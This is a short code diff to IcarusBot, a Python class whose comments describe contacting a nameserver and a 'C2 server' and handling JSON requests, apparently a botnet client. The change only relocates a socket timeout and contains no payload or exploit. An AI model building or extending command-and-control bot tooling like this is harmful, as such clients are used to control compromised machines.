@@ -49,7 +49,7 @@ class IcarusBot:
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
-        self.sock.settimeout(8)
+
         notification(self.status)
         while True:
             print("contacting nameserver")
@@ -115,6 +115,7 @@ class IcarusBot:
         while True:
             try:
                 # We now interact with this like any other object.
+                self.sock.settimeout(10)
                 jsonMsg = json.loads(self.sock.recv(4096).decode('ascii'))
                 print(jsonMsg)
                 request_type = jsonMsg['request']
